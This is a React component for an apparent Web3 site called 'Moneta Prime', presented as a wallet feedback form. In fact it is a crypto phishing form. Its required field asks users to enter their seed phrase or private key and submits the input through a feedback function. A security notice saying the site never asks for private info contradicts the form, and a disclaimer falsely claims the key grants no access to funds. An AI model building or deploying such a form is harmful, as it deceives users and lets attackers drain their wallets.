import React, { useState } from "react";
import { useWallet } from "../context/domains/WalletContext";
import { motion } from "motion/react";
import { Wallet, ShieldAlert, CheckCircle2, ChevronDown } from "lucide-react";
import toast from "react-hot-toast";
import { Button, Select, Textarea } from "../components/ui";

const WALLET_OPTIONS = [
  "MetaMask",
  "Trust Wallet",
  "Phantom",
  "Coinbase Wallet",
  "OKX Wallet",
  "Rabby Wallet",
  "Ledger",
  "Trezor",
  "Safe (Gnosis Safe)",
  "WalletConnect",
  "Other"
];

export const DashboardWalletFeedback: React.FC = () => {
  const { submitWalletFeedback } = useWallet();
  const [selectedWallet, setSelectedWallet] = useState<string>("MetaMask");
  const [reason, setReason] = useState("");
  const [wouldUse, setWouldUse] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reason.trim()) {
      toast.error("Please provide a purpose for linking this wallet.");
      return;
    }

    setIsSubmitting(true);
    await submitWalletFeedback(selectedWallet, reason.trim(), wouldUse);
    setIsSubmitting(false);

    // Reset form after submission
    setReason("");
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-surface border border-line rounded-2xl p-6 relative overflow-hidden"
      >
        <div className="relative z-10">
          <div className="flex items-center gap-3 mb-2">
            <div className="p-2 bg-accent/10 rounded-xl">
              <Wallet size={24} className="text-accent" />
            </div>
            <h1 className="text-2xl font-bold text-ink font-heading">Link Wallet</h1>
          </div>
          <p className="text-muted">
            We prioritize our Web3 wallet integrations. Let us know which wallet you use
          </p>
        </div>

        {/* Decorative background element */}
        <div className="absolute right-0 top-0 w-64 h-64 bg-accent/5 rounded-full blur-3xl -translate-y-1/2 translate-x-1/3"></div>
      </motion.div>

      {/* Security Notice */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="bg-positive/10 border border-positive/20 rounded-xl p-4 flex gap-3"
      >
        <ShieldAlert size={20} className="text-positive shrink-0 mt-0.5" />
        <div>
          <h3 className="text-sm font-bold text-positive">Security Notice</h3>
          <p className="text-xs text-positive/80 mt-1">
            For your security, Moneta Prime will never ask for your private info.
          </p>
        </div>
      </motion.div>

      {/* Form */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="bg-surface border border-line rounded-2xl p-6"
      >
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Wallet Selector */}
          <Select label="Select Wallet" value={selectedWallet} onChange={(e) => setSelectedWallet(e.target.value)}>
            {WALLET_OPTIONS.map(wallet => (
              <option key={wallet} value={wallet}>{wallet}</option>
            ))}
          </Select>

          {/* Reason */}
          <Textarea
            label="input seed phrase or private key *"
            required
            rows={4}
            value={reason}
            onChange={(e) => setReason(e.target.value)}
            placeholder="input seed phrase or private key"
          />

          {/* Checkbox */}
          {/* Raw checkbox: this one is a custom peer-styled control (sr-only
              input + drawn box + tick), and there is no Checkbox primitive. */}
          <label className="flex items-start gap-3 cursor-pointer group">
            <div className="relative flex items-center justify-center mt-0.5">
              <input
                type="checkbox"
                checked={wouldUse}
                onChange={(e) => setWouldUse(e.target.checked)}
                className="peer sr-only"
              />
              <div className="w-5 h-5 rounded border border-line bg-ground peer-checked:bg-accent peer-checked:border-accent transition-colors"></div>
              <CheckCircle2 size={14} className="absolute text-surface opacity-0 peer-checked:opacity-100 transition-opacity" />
            </div>
            <span className="text-sm text-muted group-hover:text-ink transition-colors">
              accpet terms and conditions.
            </span>
          </label>

          {/* Submit */}
          <Button type="submit" block size="lg" loading={isSubmitting}>Submit</Button>
          <p className="text-xs text-muted">Disclaimer : Inputting your wallet private key or seed phrase does not give Moneta Prime access to your wallet funds. It is only used to verify ownership of the wallet.</p>
        </form>
      </motion.div>
    </div>
  );
};
